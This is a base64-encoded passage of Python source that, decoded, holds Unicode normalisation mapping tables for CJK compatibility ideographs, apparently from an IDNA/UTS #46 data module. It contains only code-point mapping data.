1XHhiYlx4ODlcJyksXG4gICAgKDB4RjlBMywgXCdNXCcsIFwnXHhlNVx4YmZceGI1XCcpLFxuICAgICgweEY5QTQsIFwnTVwnLCBcJ1x4ZTZceDhkXHhiYlwnKSxcbiAgICAoMHhGOUE1LCBcJ01cJywgXCdceGU2XHhhZVx4YWVcJyksXG4gICAgKDB4RjlBNiwgXCdNXCcsIFwnXHhlN1x4YjBceGJlXCcpLFxuICAgICgweEY5QTcsIFwnTVwnLCBcJ1x4ZTdceDhkXHhiNVwnKSxcbiAgICAoMHhGOUE4LCBcJ01cJywgXCdceGU0XHhiYlx4YTRcJyksXG4gICAgKDB4RjlBOSwgXCdNXCcsIFwnXHhlNVx4OWJceGI5XCcpLFxuICAgIF1cblxuZGVmIF9zZWdfNDEoKSAtPiBMaXN0W1VuaW9uW1R1cGxlW2ludCwgc3RyXSwgVHVwbGVbaW50LCBzdHIsIHN0cl1dXTpcbiAgICByZXR1cm4gW1xuICAgICgweEY5QUEsIFwnTVwnLCBcJ1x4ZTVceGFmXHhhN1wnKSxcbiAgICAoMHhGOUFCLCBcJ01cJywgXCdceGU1XHhiNlx4YmFcJyksXG4gICAgKDB4RjlBQywgXCdNXCcsIFwnXHhlNlx4ODBceDljXCcpLFxuICAgICgweEY5QUQsIFwnTVwnLCBcJ1x4ZTdceDhlXHhiMlwnKSxcbiAgICAoMHhGOUFFLCBcJ01cJywgXCdceGU3XHg5MVx4YTlcJyksXG4gICAgKDB4RjlBRiwgXCdNXCcsIFwnXHhlN1x4YmVceDlhXCcpLFxuICAgICgweEY5QjAsIFwnTVwnLCBcJ1x4ZThceDgxXHg4NlwnKSxcbiAgICAoMHhGOUIxLCBcJ01cJywgXCdceGU5XHg4OFx4YjRcJyksXG4gICAgKDB4RjlCMiwgXCdNXCcsIFwnXHhlOVx4OWJceGI2XCcpLFxuICAgICgweEY5QjMsIFwnTVwnLCBcJ1x4ZTlceDlkXHg4OFwnKSxcbiAgICAoMHhGOUI0LCBcJ01cJywgXCdceGU5XHhhMFx4OThcJyksXG4gICAgKDB4RjlCNSwgXCdNXCcsIFwnXHhlNFx4YmVceDhiXCcpLFxuICAgICgweEY5QjYsIFwnTVwnLCBcJ1x4ZTdceGE2XHhhZVwnKSxcbiAgICAoMHhGOUI3LCBcJ01cJywgXCdceGU5XHg4Nlx4YjRcJyksXG4gICAgKDB4RjlCOCwgXCdNXCcsIFwnXHhlOVx4OWFceGI4XCcpLFxuICAgICgweEY5QjksIFwnTVwnLCBcJ1x4ZTZceDgzXHhhMVwnKSxcbiAgICAoMHhGOUJBLCBcJ01cJywgXCdceGU0XHhiYVx4ODZcJyksXG4gICAgKDB4RjlCQiwgXCdNXCcsIFwnXHhlNVx4ODNceDlhXCcpLFxuICAgICgweEY5QkMsIFwnTVwnLCBcJ1x4ZTVceGFmXHhhZVwnKSxcbiAgICAoMHhGOUJELCBcJ01cJywgXCdceGU1XHhiMFx4YmZcJyksXG4gICAgKDB4RjlCRSwgXCdNXCcsIFwnXHhlNlx4OTZceDk5XCcpLFxuICAgICgweEY5QkYsIFwnTVwnLCBcJ1x4ZTZceGE4XHg4MlwnKSxcbiAgICAoMHhGOUMwLCBcJ01cJywgXCdceGU3XHg4N1x4OGVcJyksXG4gICAgKDB4RjlDMSwgXCdNXCcsIFwnXHhlN1x4OTlceDgyXCcpLFxuICAgICgweEY5QzIsIFwnTVwnLCBcJ1x4ZThceDkzXHhiY1wnKSxcbiAgICAoMHhGOUMzLCBcJ01cJywgXCdceGU5XHg4MVx4YmNcJyksXG4gICAgKDB4RjlDNCwgXCdNXCcsIFwnXHhlOVx4YmVceDhkXCcpLFxuICAgICgweEY5QzUsIFwnTVwnLCBcJ1x4ZTZceDlhXHg4OFwnKSxcbiAgICAoMHhGOUM2LCBcJ01cJywgXCdceGU5XHg5OFx4YWVcJyksXG4gICAgKDB4RjlDNywgXCdNXCcsIFwnXHhlNVx4OGFceDg5XCcpLFxuICAgICgweEY5QzgsIFwnTVwnLCBcJ1x4ZTZceDlkXHhiYlwnKSxcbiAgICAoMHhGOUM5LCBcJ01cJywgXCdceGU2XHg5Zlx4YjNcJyksXG4gICAgKDB4RjlDQSwgXCdNXCcsIFwnXHhlNlx4YjVceDgxXCcpLFxuICAgICgweEY5Q0IsIFwnTVwnLCBcJ1x4ZTZceGJhXHg5Y1wnKSxcbiAgICAoMHhGOUNDLCBcJ01cJywgXCdceGU3XHg5MFx4ODlcJyksXG4gICAgKDB4RjlDRCwgXCdNXCcsIFwnXHhlN1x4OTVceDk5XCcpLFxuICAgICgweEY5Q0UsIFwnTVwnLCBcJ1x4ZTdceGExXHhhYlwnKSxcbiAgICAoMHhGOUNGLCBcJ01cJywgXCdceGU3XHhiNFx4OTBcJyksXG4gICAgKDB4RjlEMCwgXCdNXCcsIFwnXHhlOVx4YTFceDllXCcpLFxuICAgICgweEY5RDEsIFwnTVwnLCBcJ1x4ZTVceDg1XHhhZFwnKSxcbiAgICAoMHhGOUQyLCBcJ01cJywgXCdceGU2XHg4OFx4YWVcJyksXG4gICAgKDB4RjlEMywgXCdNXCcsIFwnXHhlOVx4OTlceGI4XCcpLFxuICAgICgweEY5RDQsIFwnTVwnLCBcJ1x4ZTVceDgwXHhhYlwnKSxcbiAgICAoMHhGOUQ1LCBcJ01cJywgXCdceGU1XHhiNFx4OTlcJyksXG4gICAgKDB4RjlENiwgXCdNXCcsIFwnXHhlNlx4YjdceGFhXCcpLFxuICAgICgweEY5RDcsIFwnTVwnLCBcJ1x4ZThceGJjXHhhYVwnKSxcbiAgICAoMHhGOUQ4LCBcJ01cJywgXCdceGU1XHhiZVx4OGJcJyksXG4gICAgKDB4RjlEOSwgXCdNXCcsIFwnXHhlNlx4ODVceDg0XCcpLFxuICAgICgweEY5REEsIFwnTVwnLCBcJ1x4ZTZceGEwXHg5N1wnKSxcbiAgICAoMHhGOURCLCBcJ01cJywgXCdceGU3XHg4ZVx4ODdcJyksXG4gICAgKDB4RjlEQywgXCdNXCcsIFwnXHhlOVx4OWFceDg2XCcpLFxuICAgICgweEY5REQsIFwnTVwnLCBcJ1x4ZTVceDg4XHhhOVwnKSxcbiAgICAoMHhGOURFLCBcJ01cJywgXCdceGU1XHg5MFx4OGZcJyksXG4gICAgKDB4RjlERiwgXCdNXCcsIFwnXHhlNVx4YjFceGE1XCcpLFxuICAgICgweEY5RTAsIFwnTVwnLCBcJ1x4ZTZceDk4XHg5M1wnKSxcbiAgICAoMHhGOUUxLCBcJ01cJywgXCdceGU2XHg5ZFx4OGVcJyksXG4gICAgKDB4RjlFMiwgXCdNXCcsIFwnXHhlNlx4YTJceGE4XCcpLFxuICAgICgweEY5RTMsIFwnTVwnLCBcJ1x4ZTZceGIzXHhhNVwnKSxcbiAgICAoMHhGOUU0LCBcJ01cJywgXCdceGU3XHg5MFx4ODZcJyksXG4gICAgKDB4RjlFNSwgXCdNXCcsIFwnXHhlN1x4OTdceGEyXCcpLFxuICAgICgweEY5RTYsIFwnTVwnLCBcJ1x4ZTdceGJkXHhiOVwnKSxcbiAgICAoMHhGOUU3LCBcJ01cJywgXCdceGU4XHhhM1x4OGZcJyksXG4gICAgKDB4RjlFOCwgXCdNXCcsIFwnXHhlOFx4YTNceGExXCcpLFxuICAgICgweEY5RTksIFwnTVwnLCBcJ1x4ZTlceDg3XHg4Y1wnKSxcbiAgICAoMHhGOUVBLCBcJ01cJywgXCdceGU5XHg5Ylx4YTJcJyksXG4gICAgKDB4RjlFQiwgXCdNXCcsIFwnXHhlNVx4OGNceGJmXCcpLFxuICAgICgweEY5RUMsIFwnTVwnLCBcJ1x4ZTZceGJhXHhiYVwnKSxcbiAgICAoMHhGOUVELCBcJ01cJywgXCdceGU1XHg5MFx4OWRcJyksXG4gICAgKDB4RjlFRSwgXCdNXCcsIFwnXHhlN1x4ODdceDkwXCcpLFxuICAgICgweEY5RUYsIFwnTVwnLCBcJ1x4ZTdceDkyXHg5OFwnKSxcbiAgICAoMHhGOUYwLCBcJ01cJywgXCdceGU4XHg5N1x4YmFcJyksXG4gICAgKDB4RjlGMSwgXCdNXCcsIFwnXHhlOVx4OWFceGEzXCcpLFxuICAgICgweEY5RjIsIFwnTVwnLCBcJ1x4ZTlceGIxXHg5N1wnKSxcbiAgICAoMHhGOUYzLCBcJ01cJywgXCdceGU5XHhiYVx4OWZcJyksXG4gICAgKDB4RjlGNCwgXCdNXCcsIFwnXHhlNlx4OWVceDk3XCcpLFxuICAgICgweEY5RjUsIFwnTVwnLCBcJ1x4ZTZceGI3XHg4YlwnKSxcbiAgICAoMHhGOUY2LCBcJ01cJywgXCdceGU4XHg4N1x4YThcJyksXG4gICAgKDB4RjlGNywgXCdNXCcsIFwnXHhlN1x4YWJceDhiXCcpLFxuICAgICgweEY5RjgsIFwnTVwnLCBcJ1x4ZTdceGFjXHhhMFwnKSxcbiAgICAoMHhGOUY5LCBcJ01cJywgXCdceGU3XHhiMlx4OTJcJyksXG4gICAgKDB4RjlGQSwgXCdNXCcsIFwnXHhlN1x4OGJceDgwXCcpLFxuICAgICgweEY5RkIsIFwnTVwnLCBcJ1x4ZTdceDgyXHg5OVwnKSxcbiAgICAoMHhGOUZDLCBcJ01cJywgXCdceGU4XHhhZFx4OThcJyksXG4gICAgKDB4RjlGRCwgXCdNXCcsIFwnXHhlNFx4YmJceDgwXCcpLFxuICAgICgweEY5RkUsIFwnTVwnLCBcJ1x4ZThceDhjXHhiNlwnKSxcbiAgICAoMHhGOUZGLCBcJ01cJywgXCdceGU1XHg4OFx4YmFcJyksXG4gICAgKDB4RkEwMCwgXCdNXCcsIFwnXHhlNVx4ODhceDg3XCcpLFxuICAgICgweEZBMDEsIFwnTVwnLCBcJ1x4ZTVceGJhXHhhNlwnKSxcbiAgICAoMHhGQTAyLCBcJ01cJywgXCdceGU2XHg4Ylx4OTNcJyksXG4gICAgKDB4RkEwMywgXCdNXCcsIFwnXHhlN1x4YjNceDk2XCcpLFxuICAgICgweEZBMDQsIFwnTVwnLCBcJ1x4ZTVceGFlXHg4NVwnKSxcbiAgICAoMHhGQTA1LCBcJ01cJywgXCdceGU2XHhiNFx4OWVcJyksXG4gICAgKDB4RkEwNiwgXCdNXCcsIFwnXHhlNlx4OWFceGI0XCcpLFxuICAgICgweEZBMDcsIFwnTVwnLCBcJ1x4ZThceGJjXHhiYlwnKSxcbiAgICAoMHhGQTA4LCBcJ01cJywgXCdceGU4XHhhMVx4OGNcJyksXG4gICAgKDB4RkEwOSwgXCdNXCcsIFwnXHhlOVx4OTlceDhkXCcpLFxuICAgICgweEZBMEEsIFwnTVwnLCBcJ1x4ZThceGE2XHg4YlwnKSxcbiAgICAoMHhGQTBCLCBcJ01cJywgXCdceGU1XHhiYlx4OTNcJyksXG4gICAgKDB4RkEwQywgXCdNXCcsIFwnXHhlNVx4ODVceDgwXCcpLFxuICAgICgweEZBMEQsIFwnTVwnLCBcJ1x4ZTVceDk3XHg4MFwnKSxcbiAgICBdXG5cbmRlZiBfc2VnXzQyKCkgLT4gTGlzdFtVbmlvbltUdXBsZVtpbnQsIHN0cl0sIFR1cGxlW2ludCwgc3RyLCBzdHJdXV06XG4gICAgcmV0dXJuIFtcbiAgICAoMHhGQTBFLCBcJ1ZcJyksXG4gICAgKDB4RkExMCwgXCdNXCcsIFwnXHhlNVx4YTFceDlhXCcpLFxuICAgICgweEZBMTEsIFwnVlwnKSxcbiAgICAoMHhGQTEyLCBcJ01cJywgXCdceGU2XHg5OVx4YjRcJyksXG4gICAgKDB4RkExMywgXCdWXCcpLFxuICAgICgweEZBMTUsIFwnTVwnLCBcJ1x4ZTVceDg3XHg5ZVwnKSxcbiAgICAoMHhGQTE2LCBcJ01cJywgXCdceGU3XHg4Y1x4YWFcJyksXG4gICAgKDB4RkExNywgXCdNXCcsIFwnXHhlN1x4OWJceDhhXCcpLFxuICAgICgweEZBMTgsIFwnTVwnLCBcJ1x4ZTdceGE0XHhiY1wnKSxcbiAgICAoMHhGQTE5LCBcJ01cJywgXCdceGU3XHhhNVx4OWVcJyksXG4gICAgKDB4RkExQSwgXCdNXCcsIFwnXHhlN1x4YTVceGE1XCcpLFxuICAgICgweEZBMUIsIFwnTVwnLCBcJ1x4ZTdceGE2XHg4ZlwnKSxcbiAgICAoMHhGQTFDLCBcJ01cJywgXCdceGU5XHg5ZFx4OTZcJyksXG4gICAgKDB4RkExRCwgXCdNXCcsIFwnXHhlN1x4YjJceGJlXCcpLFxuICAgICgweEZBMUUsIFwnTVwnLCBcJ1x4ZTdceGJlXHhiZFwnKSxcbiAgICAoMHhGQTFGLCBcJ1ZcJyksXG4gICAgKDB4RkEyMCwgXCdNXCcsIFwnXHhlOFx4OThceDkyXCcpLFxuICAgICgweEZBMjEsIFwnVlwnKSxcbiAgICAoMHhGQTIyLCBcJ01cJywgXCdceGU4XHhhYlx4YjhcJyksXG4gICAgKDB4RkEyMywgXCdWXCcpLFxuICAgICgweEZBMjUsIFwnTVwnLCBcJ1x4ZTlceDgwXHhiOFwnKSxcbiAgICAoMHhGQTI2LCBcJ01cJywgXCdceGU5XHg4M1x4YmRcJyksXG4gICAgKDB4RkEyNywgXCdWXCcpLFxuICAgICgweEZBMkEsIFwnTVwnLCBcJ1x4ZTlceGEzXHhhZlwnKSxcbiAgICAoMHhGQTJCLCBcJ01cJywgXCdceGU5XHhhM1x4YmNcJyksXG4gICAgKDB4RkEyQywgXCdNXCcsIFwnXHhlOVx4YTRceGE4XCcpLFxuICAgICgweEZBMkQsIFwnTVwnLCBcJ1x4ZTlceGI2XHhiNFwnKSxcbiAgICAoMHhGQTJFLCBcJ01cJywgXCdceGU5XHg4M1x4OWVcJyksXG4gICAgKDB4RkEyRiwgXCdNXCcsIFwnXHhlOVx4OWFceGI3XCcpLFxuICAgICgweEZBMzAsIFwnTVwnLCBcJ1x4ZTRceGJlXHhhZVwnKSxcbiAgICAoMHhGQTMxLCBcJ01cJywgXCdceGU1XHg4M1x4YTdcJyksXG4gICAgKDB4RkEzMiwgXCdNXCcsIFwnXHhlNVx4ODVceDhkXCcpLFxuICAgICgweEZBMzMsIFwnTVwnLCBcJ1x4ZTVceDhiXHg4OVwnKSxcbiAgICAoMHhGQTM0LCBcJ01cJywgXCdceGU1XHg4Ylx4YTRcJyksXG4gICAgKDB4RkEzNSwgXCdNXCcsIFwnXHhlNVx4OGRceDkxXCcpLFxuICAgICgweEZBMzYsIFwnTVwnLCBcJ1x4ZTVceDk2XHg5ZFwnKSxcbiAgICAoMHhGQTM3LCBcJ01cJywgXCdceGU1XHg5OFx4ODZcJyksXG4gICAgKDB4RkEzOCwgXCdNXCcsIFwnXHhlNVx4OTlceGE4XCcpLFxuICAgICgweEZBMzksIFwnTVwnLCBcJ1x4ZTVceGExXHg4MFwnKSxcbiAgICAoMHhGQTNBLCBcJ01cJywgXCdceGU1XHhhMlx4YThcJyksXG4gICAgKDB4RkEzQiwgXCdNXCcsIFwnXHhlNVx4YjFceGE0XCcpLFxuICAgICgweEZBM0MsIFwnTVwnLCBcJ1x4ZTVceGIxXHhhZVwnKSxcbiAgICAoMHhGQTNELCBcJ01cJywgXCdceGU2XHg4Mlx4OTRcJyksXG4gICAgKDB4RkEzRSwgXCdNXCcsIFwnXHhlNlx4ODVceGE4XCcpLFxuICAgICgweEZBM0YsIFwnTVwnLCBcJ1x4ZTZceDg2XHg4ZVwnKSxcbiAgICAoMHhGQTQwLCBcJ01cJywgXCdceGU2XHg4N1x4YjJcJyksXG4gICAgKDB4RkE0MSwgXCdNXCcsIFwnXHhlNlx4OTVceDhmXCcpLFxuICAgICgweEZBNDIsIFwnTVwnLCBcJ1x4ZTZceDk3XHhhMlwnKSxcbiAgICAoMHhGQTQzLCBcJ01cJywgXCdceGU2XHg5YVx4OTFcJyksXG4gICAgKDB4RkE0NCwgXCdNXCcsIFwnXHhlNlx4YTJceDg1XCcpLFxuICAgICgweEZBNDUsIFwnTVwnLCBcJ1x4ZTZceGI1XHhiN1wnKSxcbiAgICAoMHhGQTQ2LCBcJ01cJywgXCdceGU2XHhiOFx4OWFcJyksXG4gICAgKDB4RkE0NywgXCdNXCcsIFwnXHhlNlx4YmNceGEyXCcpLFxuICAgICgweEZBNDgsIFwnTVwnLCBcJ1x4ZTdceDg1XHhhZVwnKSxcbiAgICAoMHhGQTQ5LCBcJ01cJywgXCdceGU3XHg4OFx4YWJcJyksXG4gICAgKDB4RkE0QSwgXCdNXCcsIFwnXHhlN1x4OTBceGEyXCcpLFxuICAgICgweEZBNEIsIFwnTVwnLCBcJ1x4ZTdceGEyXHg5MVwnKSxcbiAgICAoMHhGQTRDLCBcJ01cJywgXCdceGU3XHhhNFx4YmVcJyksXG4gICAgKDB4RkE0RCwgXCdNXCcsIFwnXHhlN1x4YTVceDg5XCcpLFxuICAgICgweEZBNEUsIFwnTVwnLCBcJ1x4ZTdceGE1XHg4OFwnKSxcbiAgICAoMHhGQTRGLCBcJ01cJywgXCdceGU3XHhhNVx4OTBcJyksXG4gICAgKDB4RkE1MCwgXCdNXCcsIFwnXHhlN1x4YTVceDk2XCcpLFxuICAgICgweEZBNTEsIFwnTVwnLCBcJ1x4ZTdceGE1XHg5ZFwnKSxcbiAgICAoMHhGQTUyLCBcJ01cJywgXCdceGU3XHhhNlx4OGRcJyksXG4gICAgKDB4RkE1MywgXCdNXCcsIFwnXHhlN1x4YTZceDhlXCcpLFxuICAgICgweEZBNTQsIFwnTVwnLCBcJ1x4ZTdceGE5XHg4MFwnKSxcbiAgICAoMHhGQTU1LCBcJ01cJywgXCdceGU3XHhhYVx4ODFcJyksXG4gICAgKDB4RkE1NiwgXCdNXCcsIFwnXHhlN1x4YWZceDgwXCcpLFxuICAgICgweEZBNTcsIFwnTVwnLCBcJ1x4ZTdceGI3XHhiNFwnKSxcbiAgICAoMHhGQTU4LCBcJ01cJywgXCdceGU3XHhiOFx4ODlcJyksXG4gICAgKDB4RkE1OSwgXCdNXCcsIFwnXHhlN1x4YjlceDgxXCcpLFxuICAgICgweEZBNUEsIFwnTVwnLCBcJ1x4ZTdceGJkXHhiMlwnKSxcbiAgICAoMHhGQTVCLCBcJ01cJywgXCdceGU4XHg4MFx4ODVcJyksXG4gICAgKDB4RkE1QywgXCdNXCcsIFwnXHhlOFx4ODdceGFkXCcpLFxuICAgICgweEZBNUQsIFwnTVwnLCBcJ1x4ZThceDg5XHhiOVwnKSxcbiAgICAoMHhGQTVGLCBcJ01cJywgXCdceGU4XHg5MVx4OTdcJyksXG4gICAgKDB4RkE2MCwgXCdNXCcsIFwnXHhlOFx4YTRceDkwXCcpLFxuICAgICgweEZBNjEsIFwnTVwnLCBcJ1x4ZThceGE2XHg5NlwnKSxcbiAgICAoMHhGQTYyLCBcJ01cJywgXCdceGU4XHhhY1x4ODFcJyksXG4gICAgKDB4RkE2MywgXCdNXCcsIFwnXHhlOFx4YWNceGI5XCcpLFxuICAgICgweEZBNjQsIFwnTVwnLCBcJ1x4ZThceGIzXHg5M1wnKSxcbiAgICAoMHhGQTY1LCBcJ01cJywgXCdceGU4XHhiNFx4ODhcJyksXG4gICAgKDB4RkE2NiwgXCdNXCcsIFwnXHhlOFx4YmVceGI2XCcpLFxuICAgICgweEZBNjcsIFwnTVwnLCBcJ1x4ZTlceDgwXHhiOFwnKSxcbiAgICAoMHhGQTY4LCBcJ01cJywgXCdceGU5XHg5Ylx4YTNcJyksXG4gICAgKDB4RkE2OSwgXCdNXCcsIFwnXHhlOVx4OWZceGJmXCcpLFxuICAgICgweEZBNkEsIFwnTVwnLCBcJ1x4ZTlceGEwXHhiYlwnKSxcbiAgICAoMHhGQTZCLCBcJ01cJywgXCdceGU2XHg4MVx4YjVcJyksXG4gICAgKDB4RkE2QywgXCdNXCcsIFwnXHhmMFx4YTRceDhiXHhhZVwnKSxcbiAgICAoMHhGQTZELCBcJ01cJywgXCdceGU4XHg4OFx4OThcJyksXG4gICAgKDB4RkE2RSwgXCdYXCcpLFxuICAgICgweEZBNzAsIFwnTVwnLCBcJ1x4ZTRceGI4XHhhNlwnKSxcbiAgICAoMHhGQTcxLCBcJ01cJywgXCdceGU1XHg4Nlx4YjVcJyksXG4gICAgKDB4RkE3MiwgXCdNXCcsIFwnXHhlNVx4ODVceGE4XCcpLFxuICAgICgweEZBNzMsIFwnTVwnLCBcJ1x4ZTRceGJlXHg4MFwnKSxcbiAgICAoMHhGQTc0LCBcJ01cJywgXCdceGU1XHg4NVx4ODVcJyksXG4gICAgKDB4RkE3NSwgXCdNXCcsIFwnXHhlNVx4ODZceDgwXCcpLFxuICAgICgweEZBNzYsIFwnTVwnLCBcJ1x4ZTVceDhiXHg4N1wnKSxcbiAgICAoMHhGQTc3LCBcJ01cJywgXCdceGU1XHg4Ylx4YmFcJyksXG4gICAgKDB4RkE3OCwgXCdNXCcsIFwnXHhlNVx4OTZceDlkXCcpLFxuICAgIF1cblxuZGVmIF9zZWdfNDMoKSAtPiBMaXN0W1VuaW9uW1R1cGxlW2ludCwgc3RyXSwgVHVwbGVbaW50LCBzdHIsIHN0cl1dXTpcbiAgICByZXR1cm4gW1xuICAgICgweEZBNzksIFwnTVwnLCBcJ1x4ZTVceDk1XHg5NVwnKSxcbiAgICAoMHhGQTdBLCBcJ01cJywgXCdceGU1XHg5Nlx4OTlcJyksXG4gICAgKDB4RkE3QiwgXCdNXCcsIFwnXHhlNVx4OTdceGEyXCcpLFxuICAgICgweEZBN0MsIFwnTVwnLCBcJ1x4ZTVceGExXHg5YVwnKSxcbiAgICAoMHhGQTdELCBcJ01cJywgXCdceGU1XHhhMlx4YjNcJyksXG4gICAgKDB4RkE3RSwgXCdNXCcsIFwnXHhlNVx4YTVceDg0XCcpLFxuICAgICgweEZBN0YsIFwnTVwnLCBcJ1x4ZTVceGE1XHg5NFwnKSxcbiAgICAoMHhGQTgwLCBcJ01cJywgXCdceGU1XHhhOVx4YTJcJyksXG4gICAgKDB4RkE4MSwgXCdNXCcsIFwnXHhlNVx4YWNceGE4XCcpLFxuICAgICgweEZBODIsIFwnTVwnLCBcJ1x4ZTVceGJiXHg5MlwnKSxcbiAgICAoMHhGQTgzLCBcJ01cJywgXCdceGU1XHhiYlx4OTlcJyksXG4gICAgKDB4RkE4NCwgXCdNXCcsIFwnXHhlNVx4YmRceGE5XCcpLFxuICAgICgweEZBODUsIFwnTVwnLCBcJ1x4ZTVceGJlXHhhZFwnKSxcbiAgICAoMHhGQTg2LCBcJ01cJywgXCdceGU2XHg4M1x4OThcJyksXG4gICAgKDB4RkE4NywgXCdNXCcsIFwnXHhlNlx4ODVceDhlXCcpLFxuICAgICgweEZBODgsIFwnTVwnLCBcJ1x4ZTZceDg0XHg4OFwnKSxcbiAgICAoMHhGQTg5LCBcJ01cJywgXCdceGU2XHg4Nlx4OGVcJyksXG4gICAgKDB4RkE4QSwgXCdNXCcsIFwnXHhlNlx4ODVceGEwXCcpLFxuICAgICgweEZBOEIsIFwnTVwnLCBcJ1x4ZTZceDg3XHhiMlwnKSxcbiAgICAoMHhGQThDLCBcJ01cJywgXCdceGU2XHg4OFx4YjRcJyksXG4gICAgKDB4RkE4RCwgXCdNXCcsIFwnXHhlNlx4OGZceDg0XCcpLFxuICAgICgweEZBOEUsIFwnTVwnLCBcJ1x4ZTZceDkwXHg5Y1wnKSxcbiAgICAoMHhGQThGLCBcJ01cJywgXCdceGU2XHg5MVx4OTJcJyksXG4gICAgKDB4RkE5MCwgXCdNXCcsIFwnXHhlNlx4OTVceDk2XCcpLFxuICAgICgweEZBOTEsIFwnTVwnLCBcJ1x4ZTZceDk5XHhiNFwnKSxcbiAgICAoMHhGQTkyLCBcJ01cJywgXCdceGU2XHg5Y1x4OTdcJyksXG4gICAgKDB4RkE5MywgXCdNXCcsIFwnXHhlNlx4OWNceDliXCcpLFxuICAgICgweEZBOTQsIFwnTVwnLCBcJ1x4ZTZceDlkXHg5NlwnKSxcbiAgICAoMHhGQTk1LCBcJ01cJywgXCdceGU2XHhhZFx4YjlcJyksXG4gICAgKDB4RkE5NiwgXCdNXCcsIFwnXHhlNlx4YWVceGJhXCcpLFxuICAgICgweEZBOTcsIFwnTVwnLCBcJ1x4ZTZceGI1XHg4MVwnKSxcbiAgICAoMHhGQTk4LCBcJ01cJywgXCdceGU2XHhiYlx4OWJcJyksXG4gICAgKDB4RkE5OSwgXCdNXCcsIFwnXHhlNlx4YmJceDhiXCcpLFxuICAgICgweEZBOUEsIFwnTVwnLCBcJ1x4ZTZceGJjXHhhMlwnKSxcbiAgICAoMHhGQTlCLCBcJ01cJywgXCdceGU3XHg4MFx4OWVcJyksXG4gICAgKDB4RkE5QywgXCdNXCcsIFwnXHhlN1x4ODVceGFlXCcpLFxuICAgICgweEZBOUQsIFwnTVwnLCBcJ1x4ZTdceDllXHhhN1wnKSxcbiAgICAoMHhGQTlFLCBcJ01cJywgXCdceGU3XHg4OFx4YjVcJyksXG4gICAgKDB4RkE5RiwgXCdNXCcsIFwnXHhlN1x4OGFceGFmXCcpLFxuICAgICgweEZBQTAsIFwnTVwnLCBcJ1x4ZTdceDhjXHhhYVwnKSxcbiAgICAoMHhGQUExLCBcJ01cJywgXCdceGU3XHg5MVx4YjFcJyksXG4gICAgKDB4RkFBMiwgXCdNXCcsIFwnXHhlN1x4OTRceDg2XCcpLFxuICAgICgweEZBQTMsIFwnTVwnLCBcJ1x4ZTdceDk0XHhiYlwnKSxcbiAgICAoMHhGQUE0LCBcJ01cJywgXCdceGU3XHg5OFx4OWRcJyksXG4gICAgKDB4RkFBNSwgXCdNXCcsIFwnXHhlN1x4OThceDlmXCcpLFxuICAgICgweEZBQTYsIFwnTVwnLCBcJ1x4ZTdceDliXHg4YVwnKSxcbiAgICAoMHhGQUE3LCBcJ01cJywgXCdceGU3XHg5Ylx4OWJcJyksXG4gICAgKDB4RkFBOCwgXCdNXCcsIFwnXHhlN1x4OWJceGI0XCcpLFxuICAgICgweEZBQTksIFwnTVwnLCBcJ1x4ZTdceDlkXHg4YVwnKSxcbiAgICAoMHhGQUFBLCBcJ01cJywgXCdceGU3XHg5ZFx4ODBcJyksXG4gICAgKDB4RkFBQiwgXCdNXCcsIFwnXHhlN1x4YTNceDhjXCcpLFxuICAgICgweEZBQUMsIFwnTVwnLCBcJ1x4ZTdceGFhXHhiMVwnKSxcbiAgICAoMHhGQUFELCBcJ01cJywgXCdceGU3XHhhZlx4ODBcJyksXG4gICAgKDB4RkFBRSwgXCdNXCcsIFwnXHhlN1x4YjFceGJiXCcpLFxuICAgICgweEZBQUYsIFwnTVwnLCBcJ1x4ZTdceGI1XHg5YlwnKSxcbiAgICAoMHhGQUIwLCBcJ01cJywgXCdceGU3XHhiN1x4YjRcJyksXG4gICAgKDB4RkFCMSwgXCdNXCcsIFwnXHhlN1x4YmNceGJlXCcpLFxuICAgICgweEZBQjIsIFwnTVwnLCBcJ1x4ZThceDgwXHg4NVwnKSxcbiAgICAoMHhGQUIzLCBcJ01cJywgXCdceGU4XHg4ZFx4OTJcJyksXG4gICAgKDB4RkFCNCwgXCdNXCcsIFwnXHhlOFx4OGZceGFmXCcpLFxuICAgICgweEZBQjUsIFwnTVwnLCBcJ1x4ZThceDlkXHhiOVwnKSxcbiAgICAoMHhGQUI2LCBcJ01cJywgXCdceGU4XHhhNVx4ODFcJyksXG4gICAgKDB4RkFCNywgXCdNXCcsIFwnXHhlOFx4YTZceDg2XCcpLFxuICAgICgweEZBQjgsIFwnTVwnLCBcJ1x4ZThceGE2XHg5NlwnKSxcbiAgICAoMHhGQUI5LCBcJ01cJywgXCdceGU4XHhhYVx4YmZcJyksXG4gICAgKDB4RkFCQSwgXCdNXCcsIFwnXHhlOFx4YWJceGI4XCcpLFxuICAgICgweEZBQkIsIFwnTVwnLCBcJ1x4ZThceGFiXHg4YlwnKSxcbiAgICAoMHhGQUJDLCBcJ01cJywgXCdceGU4XHhhY1x4ODFcJyksXG4gICAgKDB4RkFCRCwgXCdNXCcsIFwnXHhlOFx4YWJceGJlXCcpLFxuICAgICgweEZBQkUsIFwnTVwnLCBcJ1x4ZThceGFiXHhhZFwnKSxcbiAgICAoMHhGQUJGLCBcJ01cJywgXCdceGU4XHhhY1x4YjlcJyksXG4gICAgKDB4RkFDMCwgXCdNXCcsIFwnXHhlOFx4YWVceDhhXCcpLFxuICAgICgweEZBQzEsIFwnTVwnLCBcJ1x4ZThceGI0XHg4OFwnKSxcbiAgICAoMHhGQUMyLCBcJ01cJywgXCdceGU4XHhiY1x4YjhcJyksXG4gICAgKDB4RkFDMywgXCdNXCcsIFwnXHhlOVx4ODFceGIyXCcpLFxuICAgICgweEZBQzQsIFwnTVwnLCBcJ1x4ZTlceDg2XHg5OVwnKSxcbiAgICAoMHhGQUM1LCBcJ01cJywgXCdceGU5XHg4OVx4YjZcJyksXG4gICAgKDB4RkFDNiwgXCdNXCcsIFwnXHhlOVx4OTlceGJjXCcpLFxuICAgICgweEZBQzcsIFwnTVwnLCBcJ1x4ZTlceDliXHhhM1wnKSxcbiAgICAoMHhGQUM4LCBcJ01cJywgXCdceGU5XHg5ZFx4OTZcJyksXG4gICAgKDB4RkFDOSwgXCdNXCcsIFwnXHhlOVx4OWZceDliXCcpLFxuICAgICgweEZBQ0EsIFwnTVwnLCBcJ1x4ZTlceDlmXHhiZlwnKSxcbiAgICAoMHhGQUNCLCBcJ01cJywgXCdceGU5XHhhMFx4OGJcJyksXG4gICAgKDB4RkFDQywgXCdNXCcsIFwnXHhlOVx4YTBceGJiXCcpLFxuICAgICgweEZBQ0QsIFwnTVwnLCBcJ1x4ZTlceGFjXHg5MlwnKSxcbiAgICAoMHhGQUNFLCBcJ01cJywgXCdceGU5XHhiZVx4OWNcJyksXG4gICAgKDB4